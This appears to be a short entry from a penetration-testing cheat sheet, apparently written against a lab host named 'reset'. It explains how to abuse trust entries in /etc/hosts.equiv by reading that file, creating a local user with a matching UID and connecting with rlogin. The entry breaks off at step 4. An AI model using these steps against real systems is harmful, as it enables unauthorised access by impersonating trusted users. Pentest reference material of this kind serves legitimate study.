item.title: R Services
item.description: Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted "trusted" r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a fake user sudo adduser --uid <UID> <USER> # Switch user su <USER> 3. Connect # Installation sudo apt install rsh-redone-client # Connect rlogin <TARGET> 4.
